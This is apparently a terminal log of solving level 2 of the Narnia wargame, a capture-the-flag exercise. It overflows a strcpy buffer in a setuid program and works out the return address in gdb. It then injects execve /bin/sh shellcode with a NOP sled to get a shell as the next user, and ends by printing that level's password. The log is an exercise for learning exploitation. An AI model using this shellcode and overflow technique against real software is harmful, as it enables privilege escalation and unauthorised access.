narnia2@narnia:~$ cd ..
narnia2@narnia:/home$ cd ..
narnia2@narnia:/$ ls
bin      dev   initrd.img      lib32   lost+found  narnia  README.txt  sbin   sys  var
boot     etc   initrd.img.old  lib64   media       opt     root        share  tmp  vmlinuz
cgroup2  home  lib             libx32  mnt         proc    run         srv    usr  vmlinuz.old
narnia2@narnia:/$ cd narnia
narnia2@narnia:/narnia$ ls
narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
narnia2@narnia:/narnia$ cat narnia2.c
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}

narnia2@narnia:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@narnia:/narnia$ ./narnia2 hello
hello
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print 'A' * 128")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print 'A' * 130")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print 'A' * 150")
Segmentation fault
narnia2@narnia:/narnia$ echo "ok cool"
ok cool
narnia2@narnia:/narnia$ gdb ./narnia2
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./narnia2...(no debugging symbols found)...done.
(gdb) break *main
Breakpoint 1 at 0x804844b
(gdb) run $(python -c "print 'A' * 150")
Starting program: /narnia/narnia2 $(python -c "print 'A' * 150")

Breakpoint 1, 0x0804844b in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) run $(python -c "print 'A' * 138 + 'B' * 6")
Starting program: /narnia/narnia2 $(python -c "print 'A' * 138 + 'B' * 6")

Breakpoint 1, 0x0804844b in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/200x $esp
0xffffd640:     0x42424141      0x42424242      0xffffd600      0x00000000
0xffffd650:     0x00000000      0x00000000      0xf7fc5000      0xf7ffdc0c
0xffffd660:     0xf7ffd000      0x00000000      0x00000002      0xf7fc5000
0xffffd670:     0x00000000      0x9adda44e      0xa035a85e      0x00000000
0xffffd680:     0x00000000      0x00000000      0x00000002      0x08048350
0xffffd690:     0x00000000      0xf7fee710      0xf7e2a199      0xf7ffd000
0xffffd6a0:     0x00000002      0x08048350      0x00000000      0x08048371
0xffffd6b0:     0x0804844b      0x00000002      0xffffd6d4      0x080484a0
0xffffd6c0:     0x08048500      0xf7fe9070      0xffffd6cc      0xf7ffd920
0xffffd6d0:     0x00000002      0xffffd807      0xffffd817      0x00000000
0xffffd6e0:     0xffffd8a8      0xffffd8bb      0xffffde77      0xffffdead
0xffffd6f0:     0xffffdebc      0xffffdecd      0xffffded6      0xffffdee3
0xffffd700:     0xffffdeef      0xffffdef8      0xffffdf0b      0xffffdf2e
0xffffd710:     0xffffdf41      0xffffdf4c      0xffffdf63      0xffffdf73
0xffffd720:     0xffffdf87      0xffffdf92      0xffffdf9a      0xffffdfaa
0xffffd730:     0x00000000      0x00000020      0xf7fd7c90      0x00000021
0xffffd740:     0xf7fd7000      0x00000010      0x178bfbff      0x00000006
0xffffd750:     0x00001000      0x00000011      0x00000064      0x00000003
0xffffd760:     0x08048034      0x00000004      0x00000020      0x00000005
0xffffd770:     0x00000008      0x00000007      0xf7fd9000      0x00000008
0xffffd780:     0x00000000      0x00000009      0x08048350      0x0000000b
0xffffd790:     0x000036b2      0x0000000c      0x000036b2      0x0000000d
0xffffd7a0:     0x000036b2      0x0000000e      0x000036b2      0x00000017
0xffffd7b0:     0x00000001      0x00000019      0xffffd7eb      0x0000001a
0xffffd7c0:     0x00000000      0x0000001f      0xffffdfe8      0x0000000f
0xffffd7d0:     0xffffd7fb      0x00000000      0x00000000      0x00000000
0xffffd7e0:     0x00000000      0x00000000      0x5f000000      0x92186fd0
0xffffd7f0:     0x69d8b2b8      0xf2d43846      0x695a8ec8      0x00363836
0xffffd800:     0x00000000      0x2f000000      0x6e72616e      0x6e2f6169
0xffffd810:     0x696e7261      0x41003261      0x41414141      0x41414141
0xffffd820:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd830:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd840:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd850:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd860:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd870:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd880:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd890:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd8a0:     0x42424241      0x00424242      0x415f434c      0x653d4c4c
0xffffd8b0:     0x53555f6e      0x4654552e      0x4c00382d      0x4f435f53
0xffffd8c0:     0x53524f4c      0x3d73723d      0x69643a30      0x3b31303d
0xffffd8d0:     0x6c3a3433      0x31303d6e      0x3a36333b      0x303d686d
0xffffd8e0:     0x69703a30      0x3b30343d      0x733a3333      0x31303d6f
0xffffd8f0:     0x3a35333b      0x303d6f64      0x35333b31      0x3d64623a
0xffffd900:     0x333b3034      0x31303b33      0x3d64633a      0x333b3034
---Type <return> to continue, or q <return> to quit---q
Quit
narnia2@narnia:/narnia$ python -c'print(len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"))'
25
narnia2@narnia:/narnia$ echo "now we know the return address (EIP) and the length of the shell we want to spawn"
now we know the return address (EIP) and the length of the shell we want to spawn
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x63\xd8\xff\xff'")
Segmentation fault
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print 'A' * 102 + '\x31\xc0\x50\x68\
x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0
\x40\xcd\x80' + '\x63\xd8\xff\xff'")
Segmentation fault
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print 'A' * 100 + '\x31\xc0\x50\x68\
x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0
\x40\xcd\x80' + '\x63\xd8\xff\xff'")
Segmentation fault
narnia2@narnia:/narnia$ ./narnia2 $(python -c "print 'A' * 98 + '\x31\xc0\x50\x68\x
2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\
x40\xcd\x80' + '\x63\xd8\xff\xff'")
narnia2@narnia:/narnia$ whoami
narnia2
.
.
.
// After an embaressing amount of time I decided to try a nop sled.
// And eventually...
.
.
.
narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"')
$ whoami
narnia3
$ cd /etc
$ cd narnia_pass
$ cat narnia3
vaequeezee
.
.
.
// narnia3:vaequeezee
